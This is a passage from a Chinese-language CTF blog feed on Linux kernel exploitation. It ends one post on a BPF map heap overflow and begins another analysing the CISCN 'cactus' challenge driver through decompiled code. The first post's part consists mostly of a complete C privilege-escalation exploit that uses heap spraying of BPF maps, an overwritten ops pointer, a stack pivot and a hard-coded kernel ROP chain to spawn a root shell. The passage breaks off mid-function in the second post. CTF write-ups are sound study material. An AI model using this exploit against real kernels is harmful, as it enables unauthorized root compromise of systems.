class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里利用memcpy将堆块上的内容复制到目标地址。这里查看qs的定义可以看出来其实就是往管理堆块下面相邻的堆块进行写入，但是因为我们上面申请的size只是管理堆块的size这也就导致了我们可以进行堆溢出。</p><h3 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h3><p>其实从上面分析到这里可以看出来这里的功能主要是要干嘛的，并且分析出来qs的结构。这里简化一下结构体其实就是类似于msg_msg的一种结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  manager;</span><br><span class="line">  data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过我们每次进行update的时候只能够修改data中的一个小块，而这些小块又被分成了<code>attr-&gt;max_entries + 1</code>个，并且每个小块的size为：<code>attr-&gt;value_size</code>。</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>这里主要利用堆风水使我们分配的两个object相邻，接着修改掉ops指针，劫持函数实现站栈迁移即可。</p><p>这里使用到的gadget在 <a href="https://cv196082.gitee.io/2022/08/14/modify-ldt%E5%88%A9%E7%94%A8/">modify_ldt利用</a> 中提到过，不熟悉的可以去看看这里就不再赘述。</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPRAY_NUMBER 14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_bpf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bpf 321</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs = <span class="number">0xffffffff81c00d5a</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> iretq = <span class="number">0xffffffff8106d8f4</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_pivot_gadget = <span class="number">0xffffffff81954dc8</span>;</span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> res;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> fake_ops[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pointer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> *rop_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)buf = <span class="number">0x17</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">8</span>) = <span class="number">0x40</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">12</span>) = <span class="number">-1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">16</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">20</span>) = <span class="number">-1</span>;</span><br><span class="line">    res = syscall(__NR_bpf, <span class="number">0</span>, buf, <span class="number">0x2c</span>);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;BPF_MAP_CREATE error!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> victim[SPRAY_NUMBER];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SPRAY_NUMBER; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        victim[i] = syscall(__NR_bpf, <span class="number">0</span>, buf, <span class="number">0x2c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;spray finished!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_ops[<span class="number">2</span>] = stack_pivot_gadget;</span><br><span class="line">    pointer[<span class="number">6</span>] = fake_ops;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)buf = res;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + <span class="number">16</span>) = pointer;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + <span class="number">24</span>) = <span class="number">2</span>;</span><br><span class="line">    syscall(__NR_bpf, <span class="number">2</span>, buf, <span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;changed ops\n&quot;</span>);</span><br><span class="line">    rop_addr = mmap(<span class="number">0x81954000</span>, <span class="number">0x8000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff81029c71</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0x6f0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff810013b9</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xFFFFFFFF810E3D40</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff81001c50</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff810013b9</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff81264e0b</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xFFFFFFFF810E3AB0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff81c00d5a</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0x246</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff8106d8f4</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = (<span class="keyword">uint64_t</span>)get_shell;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = (<span class="keyword">uint64_t</span>)user_cs;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = (<span class="keyword">uint64_t</span>)user_rflags;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = (<span class="keyword">uint64_t</span>)user_sp;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = (<span class="keyword">uint64_t</span>)user_ss;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(<span class="number">0x81954dc8</span>) = <span class="number">0xffffffff81029c71</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SPRAY_NUMBER; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(victim[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221002145034272.png"                      alt="image-20221002145034272"                ></p><hr><p>参考链接:<a class="link"   href="http://p4nda.top/2019/01/02/kernel-bpf-overflow/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8" >http://p4nda.top/2019/01/02/kernel-bpf-overflow/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目会放在:&lt;a class=&quot;link&quot;   href=&quot;https://github.com/196082/196082&quot; &gt;https://github.com/196082/196082&lt;i class=&quot;fas fa-external-link-alt&quot;&gt;&lt;/i&gt;</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="bpf" scheme="https://cv196082.gitee.io/tags/bpf/"/>
    
    <category term="堆喷射" scheme="https://cv196082.gitee.io/tags/%E5%A0%86%E5%96%B7%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>ciscn cactus复现</title>
    <link href="https://cv196082.gitee.io/2022/09/22/ciscn-cactus%E5%A4%8D%E7%8E%B0/"/>
    <id>https://cv196082.gitee.io/2022/09/22/ciscn-cactus%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-09-22T10:17:02.000Z</published>
    <updated>2022-09-23T07:12:41.912Z</updated>
    
    <content type="html"><![CDATA[<p>其实这道题很简单，但是因为那个d3kheap卡得太久了并且内核版本是5.13所以我默认这道题目的版本也为5.13了，导致我完全没有去想利用userfaultfd，但题目内核实际版本是5.10.102。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>这里想问佬们一个问题，就是为什么这道题不能够同时打开两个设备。因为我最开始的思路就是打开两个设备造成UAF，但是就是打不开。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">kernel_open</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(__int64, __int64, __int64))_fentry__)(a1, a2, a3);</span><br><span class="line">  <span class="keyword">if</span> ( !flags )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = kmalloc_caches[<span class="number">8</span>];</span><br><span class="line">    flags = <span class="number">1</span>;</span><br><span class="line">    buffer = (<span class="keyword">char</span> *)kmem_cache_alloc_trace(v3, <span class="number">0xCC0</span>LL, <span class="number">0x100</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( buffer )</span><br><span class="line">      kernel_open_cold();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">kernel_release</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> **v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  v2 = addrList;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    *v2++ = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v2 != &amp;addrList[<span class="number">0x20</span>] );</span><br><span class="line">  kfree(buffer);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  flags = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后这道题的主要函数就是ioctl其余的对做题不影响就不提了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">kernel_ioctl</span><span class="params">(file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 idx_low; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// r12</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v12; <span class="comment">// r13</span></span><br><span class="line">  __int64 v13; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">char</span> *buf; <span class="comment">// r14</span></span><br><span class="line">  edit_args a4; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v16; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(file, *(_QWORD *)&amp;cmd);</span><br><span class="line">  v16 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">0x30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !copy_from_user(&amp;a4, v3, <span class="number">8LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( delFlags &lt;= <span class="number">1</span> &amp;&amp; LODWORD(a4.idx) &lt;= <span class="number">0x20</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        idx_low = LODWORD(a4.idx);</span><br><span class="line">        v6 = addrList[LODWORD(a4.idx)];</span><br><span class="line">        <span class="keyword">if</span> ( v6 )</span><br><span class="line">        &#123;</span><br><span class="line">          kfree(v6);</span><br><span class="line">          ++delFlags;</span><br><span class="line">          addrList[idx_low] = <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">0x50</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !copy_from_user(&amp;a4, v3, <span class="number">0x18</span>LL) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( editFlags &lt;= <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        size = a4.size;</span><br><span class="line">        <span class="keyword">if</span> ( LODWORD(a4.size) &gt; <span class="number">0x400</span> )</span><br><span class="line">          size = <span class="number">0x400</span>;</span><br><span class="line">        <span class="keyword">if</span> ( LODWORD(a4.idx) &lt;= <span class="number">0x20</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v12 = addrList[LODWORD(a4.idx)];</span><br><span class="line">          <span class="keyword">if</span> ( v12 )</span><br><span class="line">          &#123;</span><br><span class="line">            v13 = size;</span><br><span class="line">            buf = a4.buf;</span><br><span class="line">            _check_object_size(v12, size, <span class="number">0LL</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !copy_from_user(v12, buf, v13) )</span><br><span class="line">            &#123;</span><br><span class="line">              ++editFlags;</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( cmd != <span class="number">0x20</span> )</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(&amp;a4, v3, <span class="number">0x10</span>LL) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( addFlags &gt; <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v7 = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">10</span>], <span class="number">0xCC0</span>LL, <span class="number">0x400</span>LL);</span><br><span 